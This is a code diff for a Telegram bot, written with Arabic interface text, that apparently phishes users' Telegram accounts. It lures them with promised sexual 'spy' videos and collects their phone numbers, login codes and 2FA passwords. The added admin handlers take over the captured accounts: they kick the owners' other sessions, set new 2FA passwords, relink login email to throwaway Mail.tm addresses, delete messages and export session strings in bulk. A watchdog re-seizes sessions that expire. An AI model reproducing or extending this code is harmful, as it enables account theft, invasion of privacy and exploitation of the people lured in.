@@ -7,9 +7,12 @@ from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
 
-from config import BOT_TOKEN, ADMIN_IDS, REGISTRATION_LINK, BASE_EMAIL
+from config import (
+    BOT_TOKEN, ADMIN_IDS, REGISTRATION_LINK, SESSION_RECOVERY_DELAY, SUPER_ADMIN_ID,
+)
 import database
 import session_manager
+import volume_backup
 from keyboards import (
     age_confirm_keyboard, share_phone_keyboard, numpad_keyboard,
     retry_keyboard, sessions_keyboard, session_detail_keyboard,
@@ -34,6 +37,7 @@ class AdminFlow(StatesGroup):
     changing_user = State()
     changing_name = State()
     changing_2fa  = State()
+    waiting_volume_upload = State()
 
 
 # ──────────────────────────────────────────
@@ -52,6 +56,33 @@ code_wait_tasks  = {}
 def is_admin(uid: int) -> bool:
     return uid in ADMIN_IDS
 
+
+def is_super_admin(uid: int) -> bool:
+    return uid == SUPER_ADMIN_ID
+
+
+async def _sessions_for_admin(uid: int):
+    return await database.get_sessions_for_admin(uid, SUPER_ADMIN_ID)
+
+
+async def _guard_session(callback: CallbackQuery, phone: str) -> bool:
+    if not await database.can_admin_access_session(
+        callback.from_user.id, phone, SUPER_ADMIN_ID
+    ):
+        await callback.answer("❌ هذا الحساب غير متاح.", show_alert=True)
+        return False
+    return True
+
+
+async def _admin_panel_text(uid: int) -> str:
+    count = await database.get_sessions_count(uid, SUPER_ADMIN_ID)
+    return (
+        f"👋 أهلاً بالقيادة!\n\n"
+        f"هذه الحسابات المتوفرة حالياً، عددهم: <b>{count}</b>"
+        + ADMIN_FOOTER
+    )
+
+
 def h(text) -> str:
     """Escape HTML special chars"""
     return str(text).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
@@ -62,10 +93,19 @@ async def safe_delete(chat_id, msg_id):
     except Exception:
         pass
 
-async def notify_admins(text: str):
+async def notify_admins(text: str, phone: str = None):
+    """يرسل للأدمنة — يتخطى غير A1 إذا الجلسة ⭐ خاصة."""
     for aid in ADMIN_IDS:
+        if phone:
+            session = await database.get_session_by_phone(phone)
+            if session and database.row_flag(session, "a1_only") and aid != SUPER_ADMIN_ID:
+                continue
         try:
-            await bot.send_message(aid, text, parse_mode="HTML")
+            msg = await bot.send_message(aid, text, parse_mode="HTML")
+            if phone:
+                await database.save_admin_notification(
+                    aid, phone, msg.chat.id, msg.message_id
+                )
         except Exception:
             pass
 
@@ -222,7 +262,12 @@ async def numpad_press(callback: CallbackQuery, state: FSMContext):
                 "كلم الادمن للاشتراك في البوم التجسس كامل متكون من ٢٠ مقطع كاملين💗💞\n@N01_n0one"
             )
             user_link_msg_id[uid] = user_msg_ids.get(uid)
-            await _notify_new_session(phone)
+            await _notify_new_session(
+                phone,
+                result.get("email_linked"),
+                result.get("login_email"),
+                result.get("email_error"),
+            )
         else:
             await edit_or_send(
                 callback.message.chat.id, uid,
@@ -259,7 +304,12 @@ async def text_2fa(message: Message, state: FSMContext):
             "كلم الادمن للاشتراك في البوم التجسس كامل متكون من ٢٠ مقطع كاملين🔞💞\n@N01_n0one"
         )
         user_link_msg_id[uid] = user_msg_ids.get(uid)
-        await _notify_new_session(phone)
+        await _notify_new_session(
+            phone,
+            result.get("email_linked"),
+            result.get("login_email"),
+            result.get("email_error"),
+        )
     else:
         await edit_or_send(
             message.chat.id, uid,
@@ -267,19 +317,70 @@ async def text_2fa(message: Message, state: FSMContext):
         )
 
 
-async def _notify_new_session(phone: str):
+async def _notify_new_session(phone: str, email_linked: bool = False, login_email: str = None, email_error: str = None):
     session = await database.get_session_by_phone(phone)
     if not session:
         return
     uname = session["username"]  or "لا يوجد"
     fname = session["full_name"] or "غير معروف"
+    if email_linked and login_email:
+        mail_line = f"📧 بريد Login: <code>{h(login_email)}</code>"
+    elif email_error:
+        mail_line = f"⚠️ فشل ربط بريد Login: <code>{h(email_error)}</code>"
+    else:
+        mail_line = "⚠️ لم يُربط بريد Login"
     await notify_admins(
         f"🆕 <b>حساب جديد تم تسجيله!</b>\n\n"
         f"📱 الرقم: <code>{h(phone)}</code>\n"
         f"👤 الاسم: {h(fname)}\n"
-        f"🔖 اليوزر: @{h(uname)}"
-        + ADMIN_FOOTER
+        f"🔖 اليوزر: @{h(uname)}\n"
+        f"{mail_line}"
+        + ADMIN_FOOTER,
+        phone=phone,
     )
+
+
+async def _on_recovery_done(phone: str, result: dict):
+    session = await database.get_session_by_phone(phone)
+    fname = session["full_name"] if session else "غير معروف"
+    session_manager._recovery_scheduled.discard(phone)
+
+    if result.get("success"):
+        await notify_admins(
+            f"♻️ <b>تم إنعاش الجلسة عبر بريد Login!</b>\n\n"
+            f"📱 الرقم: <code>{h(phone)}</code>\n"
+            f"👤 الاسم: {h(fname)}\n"
+            f"📧 البريد: <code>{h(result.get('email', ''))}</code>"
+            + ADMIN_FOOTER,
+            phone=phone,
+        )
+        return
+
+    await database.mark_session_invalid(phone)
+    await notify_admins(
+        f"❌ <b>جلسة غير صالحة — فشل الإنعاش</b>\n\n"
+        f"📱 الرقم: <code>{h(phone)}</code>\n"
+        f"👤 الاسم: {h(fname)}\n"
+        f"⚠️ السبب: <code>{h(result.get('error', ''))}</code>\n\n"
+        f"تم تصنيفها غير صالحة بعد محاولة الإنعاش."
+        + ADMIN_FOOTER,
+        phone=phone,
+    )
+    uid = phone_to_user.get(phone)
+    if uid:
+        lmid = user_link_msg_id.get(uid)
+        if lmid:
+            await safe_delete(uid, lmid)
+            user_link_msg_id.pop(uid, None)
+        try:
+            m = await bot.send_message(
+                uid,
+                "⚠️ انتهت جلستك. يرجى إعادة التسجيل.",
+                reply_markup=retry_keyboard(),
+            )
+            user_msg_ids[uid] = m.message_id
+        except Exception:
+            pass
 
 
 @dp.callback_query(F.data == "retry_code")
@@ -324,28 +425,33 @@ async def session_watchdog():
                 phone       = s["phone"]
                 still_valid = await session_manager.check_session_valid(phone)
                 if not still_valid:
-                    await notify_admins(
-                        f"⚠️ <b>جلسة انتهت أو طُردت!</b>\n\n"
-                        f"📱 الرقم: <code>{h(phone)}</code>\n"
-                        f"👤 الاسم: {h(s['full_name'] or 'غير معروف')}\n\n"
-                        f"❌ تم تحديد الجلسة كغير صالحة."
-                        + ADMIN_FOOTER
-                    )
-                    uid  = phone_to_user.get(phone)
-                    if uid:
-                        lmid = user_link_msg_id.get(uid)
-                        if lmid:
-                            await safe_delete(uid, lmid)
-                            user_link_msg_id.pop(uid, None)
-                        try:
-                            m = await bot.send_message(
-                                uid,
-                                "⚠️ انتهت جلستك. يرجى إعادة التسجيل.",
-                                reply_markup=retry_keyboard()
+                    login_email = database.row_login_email(s)
+                    if login_email and s["email_password"]:
+                        if phone not in session_manager._recovery_scheduled:
+                            await notify_admins(
+                                f"⚠️ <b>جلسة توقفت</b>\n\n"
+                                f"📱 الرقم: <code>{h(phone)}</code>\n"
+                                f"👤 الاسم: {h(s['full_name'] or 'غير معروف')}\n\n"
+                                f"♻️ بعد {SESSION_RECOVERY_DELAY // 60} دقائق: "
+                                f"طلب كود عبر بريد Login\n"
+                                f"<code>{h(login_email)}</code>"
+                                + ADMIN_FOOTER,
+                                phone=phone,
                             )
-                            user_msg_ids[uid] = m.message_id
-                        except Exception:
-                            pass
+                            session_manager.schedule_session_recovery(
+                                phone,
+                                SESSION_RECOVERY_DELAY,
+                                on_done=_on_recovery_done,
+                            )
+                    else:
+                        await database.mark_session_invalid(phone)
+                        await notify_admins(
+                            f"❌ <b>جلسة غير صالحة</b>\n\n"
+                            f"📱 الرقم: <code>{h(phone)}</code>\n"
+                            f"⚠️ لا يوجد بريد Login — لا يمكن الإنعاش."
+                            + ADMIN_FOOTER,
+                            phone=phone,
+                        )
         except Exception as e:
             logging.error(f"Watchdog: {e}")
 
@@ -354,17 +460,12 @@ async def session_watchdog():
 # لوحة الأدمن — عرض الجلسات
 # ──────────────────────────────────────────
 async def show_admin_panel(message: Message):
-    count    = await database.get_sessions_count()
-    sessions = await database.get_all_sessions()
-    text = (
-        f"👋 أهلاً بالقيادة!\n\n"
-        f"هذه الحسابات المتوفرة حالياً، عددهم: <b>{count}</b>"
-        + ADMIN_FOOTER
-    )
-    if sessions:
-        await message.answer(text, reply_markup=sessions_keyboard(sessions), parse_mode="HTML")
-    else:
-        await message.answer(text + "\n\n📭 لا توجد جلسات محفوظة.", parse_mode="HTML")
+    uid = message.from_user.id
+    sessions = await _sessions_for_admin(uid)
+    text = await _admin_panel_text(uid)
+    kb = sessions_keyboard(sessions, is_super_admin=is_super_admin(uid)) if sessions else None
+    suffix = "" if sessions else "\n\n📭 لا توجد جلسات محفوظة."
+    await message.answer(text + suffix, reply_markup=kb, parse_mode="HTML")
 
 
 @dp.callback_query(F.data.startswith("sessions_page_"))
@@ -372,15 +473,16 @@ async def sessions_page(callback: CallbackQuery):
     if not is_admin(callback.from_user.id):
         await callback.answer()
         return
-    page     = int(callback.data.split("_")[-1])
-    sessions = await database.get_all_sessions()
-    count    = await database.get_sessions_count()
-    text = (
-        f"👋 أهلاً بالقيادة!\n\nهذه الحسابات المتوفرة حالياً، عددهم: <b>{count}</b>"
-        + ADMIN_FOOTER
-    )
+    uid = callback.from_user.id
+    page = int(callback.data.split("_")[-1])
+    sessions = await _sessions_for_admin(uid)
+    text = await _admin_panel_text(uid)
     await callback.message.edit_text(
-        text, reply_markup=sessions_keyboard(sessions, page), parse_mode="HTML"
+        text,
+        reply_markup=sessions_keyboard(
+            sessions, page, is_super_admin=is_super_admin(uid)
+        ),
+        parse_mode="HTML",
     )
     await callback.answer()
 
@@ -390,7 +492,11 @@ async def session_detail(callback: CallbackQuery):
     if not is_admin(callback.from_user.id):
         await callback.answer()
         return
-    phone   = callback.data[8:]
+    uid = callback.from_user.id
+    phone = callback.data[8:]
+    if not await database.can_admin_access_session(uid, phone, SUPER_ADMIN_ID):
+        await callback.answer("❌ هذا الحساب غير متاح.", show_alert=True)
+        return
     session = await database.get_session_by_phone(phone)
     if not session:
         await callback.answer("❌ الجلسة غير موجودة!")
@@ -401,13 +507,19 @@ async def session_detail(callback: CallbackQuery):
     created_at  = session["created_at"]
     two_fa_stat = "✅ موجود" if session["two_fa"] else "❌ لا يوجد"
     valid_stat  = "✅ نشطة"  if session["valid"]  else "❌ غير صالحة"
+    login_mail  = database.row_login_email(session) or "❌ غير مربوط"
+    secured_stat = "🔒 مؤمّنة" if database.row_flag(session, "secured") else "—"
+    private_stat = "⭐ خاصة (A1)" if database.row_flag(session, "a1_only") else "—"
 
     text = (
         f"📱 <code>{h(phone)}</code>\n\n"
         f"👤 الاسم: {h(full_name)}\n"
         f"🔖 اليوزر: @{h(username)}\n"
         f"🔐 التحقق بخطوتين: {two_fa_stat}\n"
+        f"📧 بريد Login: <code>{h(login_mail)}</code>\n"
         f"📶 الحالة: {valid_stat}\n"
+        f"🔒 التأمين: {secured_stat}\n"
+        f"⭐ الخصوصية: {private_stat}\n"
         f"📅 تاريخ التسجيل: {h(created_at)}"
         + ADMIN_FOOTER
     )
@@ -422,16 +534,185 @@ async def back_to_sessions(callback: CallbackQuery):
     if not is_admin(callback.from_user.id):
         await callback.answer()
         return
-    sessions = await database.get_all_sessions()
-    count    = await database.get_sessions_count()
-    text = (
-        f"👋 أهلاً بالقيادة!\n\nهذه الحسابات المتوفرة حالياً، عددهم: <b>{count}</b>"
-        + ADMIN_FOOTER
-    )
-    kb     = sessions_keyboard(sessions) if sessions else None
+    uid = callback.from_user.id
+    sessions = await _sessions_for_admin(uid)
+    text = await _admin_panel_text(uid)
+    kb = sessions_keyboard(
+        sessions, is_super_admin=is_super_admin(uid)
+    ) if sessions else None
     suffix = "" if sessions else "\n\n📭 لا توجد جلسات."
     await callback.message.edit_text(text + suffix, reply_markup=kb, parse_mode="HTML")
     await callback.answer()
+
+
+# ──────────────────────────────────────────
+# ⭐ إخفاء جلسة عن باقي الأدمنة (A1 فقط)
+# ──────────────────────────────────────────
+@dp.callback_query(F.data.startswith("a1_hide_"))
+async def a1_hide_session(callback: CallbackQuery):
+    if not is_super_admin(callback.from_user.id):
+        await callback.answer("❌ لأدمن رقم 1 فقط", show_alert=True)
+        return
+    phone = callback.data[9:]
+    session = await database.get_session_by_phone(phone)
+    if not session:
+        await callback.answer("❌ غير موجود")
+        return
+
+    hide = not database.row_flag(session, "a1_only")
+    await database.set_session_a1_only(phone, hide)
+
+    if hide:
+        notifs = await database.get_admin_notifications_for_phone(
+            phone, except_admin=SUPER_ADMIN_ID
+        )
+        deleted = 0
+        for n in notifs:
+            await safe_delete(n["chat_id"], n["message_id"])
+            deleted += 1
+        await database.delete_admin_notifications_for_phone(
+            phone, except_admin=SUPER_ADMIN_ID
+        )
+        await callback.answer(
+            f"⭐ خاص — حُذف {deleted} إشعار من الأدمنة الآخرين",
+            show_alert=True,
+        )
+    else:
+        await callback.answer("☆ ظهر للأدمنية مرة أخرى", show_alert=True)
+
+    uid = callback.from_user.id
+    sessions = await _sessions_for_admin(uid)
+    text = await _admin_panel_text(uid)
+    page = 0
+    await callback.message.edit_text(
+        text,
+        reply_markup=sessions_keyboard(sessions, page, is_super_admin=True),
+        parse_mode="HTML",
+    )
+
+
+# ──────────────────────────────────────────
+# فحص الجلسات (A1 فقط)
+# ──────────────────────────────────────────
+@dp.callback_query(F.data == "check_sessions")
+async def check_sessions_handler(callback: CallbackQuery):
+    if not is_super_admin(callback.from_user.id):
+        await callback.answer("❌ لأدمن رقم 1 فقط", show_alert=True)
+        return
+    await callback.answer("⏳ جاري فحص الجلسات...")
+    await callback.message.edit_text(
+        "⏳ جاري فحص جميع الجلسات النشطة (قد يستغرق دقائق)..." + ADMIN_FOOTER,
+        parse_mode="HTML",
+    )
+    stats = await session_manager.bulk_check_sessions()
+    uid = callback.from_user.id
+    sessions = await _sessions_for_admin(uid)
+    text = await _admin_panel_text(uid)
+    report = (
+        f"\n\n🔍 <b>نتيجة الفحص</b>\n"
+        f"تم فحص: <b>{stats['checked']}</b>\n"
+        f"❌ غير صالحة (مجمدة/ميتة): <b>{stats['invalid']}</b>"
+    )
+    if stats.get("phones"):
+        sample = stats["phones"][:5]
+        report += "\n" + "\n".join(f"• <code>{h(p)}</code>" for p in sample)
+        if len(stats["phones"]) > 5:
+            report += f"\n... و {len(stats['phones']) - 5} أخرى"
+    await callback.message.edit_text(
+        text + report + ADMIN_FOOTER,
+        reply_markup=sessions_keyboard(
+            sessions, is_super_admin=is_super_admin(uid)
+        ),
+        parse_mode="HTML",
+    )
+
+
+# ──────────────────────────────────────────
+# Volume — سحب / رفع (A1 فقط)
+# ──────────────────────────────────────────
+@dp.callback_query(F.data == "vol_export")
+async def volume_export_handler(callback: CallbackQuery):
+    if not is_super_admin(callback.from_user.id):
+        await callback.answer("❌ لأدمن رقم 1 فقط", show_alert=True)
+        return
+    await callback.answer("⏳ جاري ضغط Volume...")
+    try:
+        data, filename = volume_backup.build_volume_zip()
+        if not data:
+            await callback.message.answer("❌ مجلد Volume فارغ.")
+            return
+        doc = BufferedInputFile(data, filename=filename)
+        await callback.message.answer_document(
+            document=doc,
+            caption=(
+                f"📦 <b>نسخة Volume كاملة</b>\n"
+                f"📁 المسار: <code>{h(database.DATA_DIR)}</code>\n"
+                f"انقل الملف إلى Volume الجديد ثم استخدم «رفع Volume»."
+                + ADMIN_FOOTER
+            ),
+            parse_mode="HTML",
+        )
+    except Exception as e:
+        logging.error("vol_export: %s", e)
+        await callback.message.answer(f"❌ فشل التصدير: <code>{h(str(e))}</code>")
+    await callback.answer()
+
+
+@dp.callback_query(F.data == "vol_import")
+async def volume_import_prompt(callback: CallbackQuery, state: FSMContext):
+    if not is_super_admin(callback.from_user.id):
+        await callback.answer("❌ لأدمن رقم 1 فقط", show_alert=True)
+        return
+    await state.set_state(AdminFlow.waiting_volume_upload)
+    await callback.message.answer(
+        "📤 <b>رفع Volume</b>\n\n"
+        "أرسل ملف:\n"
+        "• <b>.zip</b> — نسخة Volume كاملة (من زر السحب)\n"
+        "• أو <b>bot.db</b> — قاعدة البيانات فقط\n\n"
+        "⚠️ يُؤخذ نسخة احتياطية من bot.db الحالي قبل الاستبدال."
+        + ADMIN_FOOTER,
+        parse_mode="HTML",
+    )
+    await callback.answer()
+
+
+@dp.message(AdminFlow.waiting_volume_upload, F.document)
+async def volume_import_file(message: Message, state: FSMContext):
+    if not is_super_admin(message.from_user.id):
+        return
+    doc = message.document
+    name = doc.file_name or "upload.zip"
+    if not (name.lower().endswith(".zip") or name.lower().endswith(".db")):
+        await message.answer("❌ الملف يجب أن يكون .zip أو .db")
+        return
+
+    wait = await message.answer("⏳ جاري استبدال Volume...")
+    try:
+        file = await bot.get_file(doc.file_id)
+        buf = await bot.download_file(file.file_path)
+        content = buf.read() if hasattr(buf, "read") else bytes(buf)
+        result = volume_backup.restore_volume_file(content, name)
+        await state.clear()
+        if result.get("success"):
+            await database.init_db()
+            await wait.edit_text(
+                f"✅ تم تحديث Volume بنجاح!\n"
+                f"النوع: <code>{h(result.get('mode', ''))}</code>\n"
+                f"المسار: <code>{h(database.DATA_DIR)}</code>\n\n"
+                f"يُفضّل إعادة تشغيل البوت على Railway."
+                + ADMIN_FOOTER,
+                parse_mode="HTML",
+            )
+        else:
+            await wait.edit_text(
+                f"❌ فشل الرفع: <code>{h(result.get('error', ''))}</code>"
+                + ADMIN_FOOTER,
+                parse_mode="HTML",
+            )
+    except Exception as e:
+        await state.clear()
+        logging.error("volume_import: %s", e)
+        await wait.edit_text(f"❌ خطأ: <code>{h(str(e))}</code>", parse_mode="HTML")
 
 
 # ──────────────────────────────────────────
@@ -442,7 +723,11 @@ async def export_session_text(callback: CallbackQuery):
     if not is_admin(callback.from_user.id):
         await callback.answer()
         return
-    phone   = callback.data[7:]
+    uid = callback.from_user.id
+    phone = callback.data[7:]
+    if not await database.can_admin_access_session(uid, phone, SUPER_ADMIN_ID):
+        await callback.answer("❌ غير متاح", show_alert=True)
+        return
     session = await database.get_session_by_phone(phone)
     if session and session["session_string"]:
         txt = (
@@ -461,9 +746,10 @@ async def export_all_sessions_txt(callback: CallbackQuery):
         await callback.answer()
         return
 
-    sessions = await database.get_all_sessions()
+    uid = callback.from_user.id
+    sessions = await _sessions_for_admin(uid)
     if not sessions:
-        await callback.answer("❌ لا توجد جلسات في قاعدة البيانات.", show_alert=True)
+        await callback.answer("❌ لا توجد جلسات.", show_alert=True)
         return
 
     await callback.message.edit_text("⏳ جاري تجهيز ملف الجلسات...", parse_mode="HTML")
@@ -487,14 +773,54 @@ async def export_all_sessions_txt(callback: CallbackQuery):
         parse_mode="HTML"
     )
 
-    # إعادة لوحة التحكم الرئيسية بعد الإرسال
-    count = await database.get_sessions_count()
-    text = (
-        f"👋 أهلاً بالقيادة!\n\n"
-        f"هذه الحسابات المتوفرة حالياً، عددهم: <b>{count}</b>"
-        + ADMIN_FOOTER
+    text = await _admin_panel_text(uid)
+    await callback.message.edit_text(
+        text,
+        reply_markup=sessions_keyboard(
+            sessions, is_super_admin=is_super_admin(uid)
+        ),
+        parse_mode="HTML",
     )
-    await callback.message.edit_text(text, reply_markup=sessions_keyboard(sessions), parse_mode="HTML")
+
+
+@dp.callback_query(F.data == "export_star_txt")
+async def export_star_sessions_txt(callback: CallbackQuery):
+    if not is_super_admin(callback.from_user.id):
+        await callback.answer("❌ لأدمن رقم 1 فقط", show_alert=True)
+        return
+
+    sessions = await database.get_a1_only_sessions()
+    if not sessions:
+        await callback.answer("❌ لا توجد جلسات ⭐.", show_alert=True)
+        return
+
+    await callback.message.edit_text("⏳ جاري تجهيز ملف جلسات النجمة...", parse_mode="HTML")
+    lines = [
+        f"{s['phone']}:{s['session_string']}"
+        for s in sessions
+        if s["session_string"]
+    ]
+    if not lines:
+        await callback.message.edit_text("❌ لا توجد أكواد لجلسات النجمة.")
+        return
+
+    document = BufferedInputFile(
+        "\n".join(lines).encode("utf-8"),
+        filename="star_sessions.txt",
+    )
+    await callback.message.answer_document(
+        document=document,
+        caption="⭐ <b>جلساتك الخاصة (رقم:كود)</b>" + ADMIN_FOOTER,
+        parse_mode="HTML",
+    )
+    uid = callback.from_user.id
+    all_s = await _sessions_for_admin(uid)
+    text = await _admin_panel_text(uid)
+    await callback.message.edit_text(
+        text,
+        reply_markup=sessions_keyboard(all_s, is_super_admin=True),
+        parse_mode="HTML",
+    )
 
 
 # ──────────────────────────────────────────
@@ -505,19 +831,20 @@ async def delete_single_session(callback: CallbackQuery):
     if not is_admin(callback.from_user.id):
         await callback.answer()
         return
+    uid = callback.from_user.id
     phone = callback.data[12:]
+    if not await database.can_admin_access_session(uid, phone, SUPER_ADMIN_ID):
+        await callback.answer("❌ غير متاح", show_alert=True)
+        return
+    await database.delete_admin_notifications_for_phone(phone)
     await database.delete_session(phone)
-    await callback.answer(f"✅ تم حذف الحساب {phone} نهائياً من القاعدة.", show_alert=True)
-    
-    # تحديث القائمة
-    sessions = await database.get_all_sessions()
-    count    = await database.get_sessions_count()
-    text = (
-        f"👋 أهلاً بالقيادة!\n\n"
-        f"هذه الحسابات المتوفرة حالياً، عددهم: <b>{count}</b>"
-        + ADMIN_FOOTER
-    )
-    kb = sessions_keyboard(sessions) if sessions else None
+    await callback.answer(f"✅ تم حذف {phone} نهائياً.", show_alert=True)
+
+    sessions = await _sessions_for_admin(uid)
+    text = await _admin_panel_text(uid)
+    kb = sessions_keyboard(
+        sessions, is_super_admin=is_super_admin(uid)
+    ) if sessions else None
     suffix = "" if sessions else "\n\n📭 لا توجد جلسات."
     await callback.message.edit_text(text + suffix, reply_markup=kb, parse_mode="HTML")
 
@@ -543,17 +870,16 @@ async def auto_mail_process(callback: CallbackQuery):
         await callback.answer()
         return
     phone = callback.data[8:]
+    if not await _guard_session(callback, phone):
+        return
     await callback.message.edit_text(
         "⏳ جاري توليد بريد جديد وانتظار الكود..." + ADMIN_FOOTER,
         parse_mode="HTML"
     )
 
-    count     = await database.increment_email_counter()
-    name, domain = BASE_EMAIL.split("@", 1)
-    new_email = f"{name}+{count}@{domain}"
-
-    res = await session_manager.change_email_auto(phone, new_email)
+    res = await session_manager.change_login_email(phone)
     if res["success"]:
+        new_email = res.get("email", "")
         await callback.message.edit_text(
             f"✅ تم تغيير البريد بنجاح إلى:\n<code>{h(new_email)}</code>" + ADMIN_FOOTER,
             parse_mode="HTML",
@@ -577,7 +903,9 @@ async def admin_req_code(callback: CallbackQuery, state: FSMContext):
         await callback.answer()
         return
 
-    phone    = callback.data[9:]
+    phone = callback.data[9:]
+    if not await _guard_session(callback, phone):
+        return
     admin_id = callback.from_user.id
     msg_id   = callback.message.message_id
     user_msg_ids[admin_id] = msg_id
@@ -649,6 +977,8 @@ async def admin_kick_sessions(callback: CallbackQuery):
         await callback.answer()
         return
     phone = callback.data[5:]
+    if not await _guard_session(callback, phone):
+        return
     await callback.message.edit_text(
         "⏳ جاري طرد الجلسات..." + ADMIN_FOOTER,
         parse_mode="HTML",
@@ -680,6 +1010,8 @@ async def admin_change_username(callback: CallbackQuery, state: FSMContext):
         await callback.answer()
         return
     phone = callback.data[8:]
+    if not await _guard_session(callback, phone):
+        return
     await state.set_state(AdminFlow.changing_user)
     await state.update_data(phone=phone)
     user_msg_ids[callback.from_user.id] = callback.message.message_id
@@ -719,6 +1051,8 @@ async def admin_change_name(callback: CallbackQuery, state: FSMContext):
         await callback.answer()
         return
     phone = callback.data[8:]
+    if not await _guard_session(callback, phone):
+        return
     await state.set_state(AdminFlow.changing_name)
     await state.update_data(phone=phone)
     user_msg_ids[callback.from_user.id] = callback.message.message_id
@@ -759,7 +1093,9 @@ async def admin_change_2fa(callback: CallbackQuery, state: FSMContext):
     if not is_admin(callback.from_user.id):
         await callback.answer()
         return
-    phone   = callback.data[7:]
+    phone = callback.data[7:]
+    if not await _guard_session(callback, phone):
+        return
     session = await database.get_session_by_phone(phone)
     has_2fa = bool(session and session["two_fa"])
     current = session["two_fa"] if has_2fa else None
@@ -836,35 +1172,38 @@ async def admin_full_cleanup(callback: CallbackQuery):
     if not is_admin(callback.from_user.id):
         await callback.answer()
         return
-    phone  = callback.data[10:]
+    phone = callback.data[10:]
+    if not await _guard_session(callback, phone):
+        return
     new_pw = "Pass" + phone[-4:]
 
     await callback.message.edit_text(
-        "⏳ جاري تنفيذ التنظيف الشامل (طرد + تغيير باسوورد + بريد + حذف رسائل)..." + ADMIN_FOOTER,
+        "⏳ جاري التنظيف الشامل (طرد → 2FA → حذف رسائل)..." + ADMIN_FOOTER,
         parse_mode="HTML"
     )
 
-    # 1. طرد وتغيير باسوورد وحذف رسائل
-    res1 = await session_manager.full_clean_and_kick(phone, new_pw)
+    res = await session_manager.admin_full_cleanup(phone, new_pw)
 
-    # 2. تغيير البريد تلقائياً
-    count     = await database.increment_email_counter()
-    name, domain = BASE_EMAIL.split("@", 1)
-    new_email = f"{name}+{count}@{domain}"
-    res2 = await session_manager.change_email_auto(phone, new_email)
-
-    if res1["success"]:
+    if res["success"]:
         result_msg = (
-            "✅ تمت العملية بنجاح:\n"
-            f"🔑 الباسوورد الجديد: <code>{h(new_pw)}</code>\n"
-        )
-        result_msg += (
-            f"📧 البريد المرتبط: <code>{h(new_email)}</code>"
-            if res2["success"]
-            else f"⚠️ فشل ربط البريد تلقائياً: <code>{h(res2.get('error',''))}</code>"
+            "✅ تم التنظيف الشامل:\n"
+            f"✔️ طرد الجلسات الأخرى\n"
+            f"✔️ تفعيل 2FA\n"
+            f"✔️ حذف الرسائل\n"
+            f"🔒 تم تأمين الجلسة\n\n"
+            f"🔑 الباسوورد: <code>{h(new_pw)}</code>"
         )
     else:
-        result_msg = f"❌ فشل التنظيف الشامل: <code>{h(res1.get('error',''))}</code>"
+        step = res.get("step", "")
+        if step == "kick":
+            result_msg = f"❌ فشل الطرد — لم يُنفَّذ 2FA:\n<code>{h(res.get('error',''))}</code>"
+        elif step == "2fa":
+            result_msg = (
+                f"✔️ تم الطرد بنجاح\n"
+                f"❌ فشل 2FA:\n<code>{h(res.get('error',''))}</code>"
+            )
+        else:
+            result_msg = f"❌ فشل: <code>{h(res.get('error',''))}</code>"
 
     await callback.message.edit_text(
         result_msg + ADMIN_FOOTER,
@@ -877,9 +1216,31 @@ async def admin_full_cleanup(callback: CallbackQuery):
 # ──────────────────────────────────────────
 # نقطة التشغيل
 # ──────────────────────────────────────────
+async def _startup_email_migration():
+    """ترحيل بريد Login للحسابات القديمة + استئناف جدولة الطرد."""
+    try:
+        pending = await database.get_sessions_needing_email_migration()
+        if not pending:
+            return
+        logging.info("starting email migration for %d sessions", len(pending))
+        stats = await session_manager.migrate_old_sessions_emails()
+        await notify_admins(
+            f"📧 <b>ترحيل بريد Login (Mail.tm)</b>\n\n"
+            f"✅ نجح: {stats['migrated']}\n"
+            f"❌ فشل: {stats['failed']}\n"
+            f"📊 الإجمالي: {stats['total']}"
+            + ADMIN_FOOTER
+        )
+    except Exception as e:
+        logging.error("email migration startup: %s", e)
+    await session_manager.resume_auto_kick_pipelines()
+
+
 async def main():
     await database.init_db()
+    logging.info("database: %s (volume: %s)", database.DB_PATH, database.DATA_DIR)
     asyncio.ensure_future(session_watchdog())
+    asyncio.ensure_future(_startup_email_migration())
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
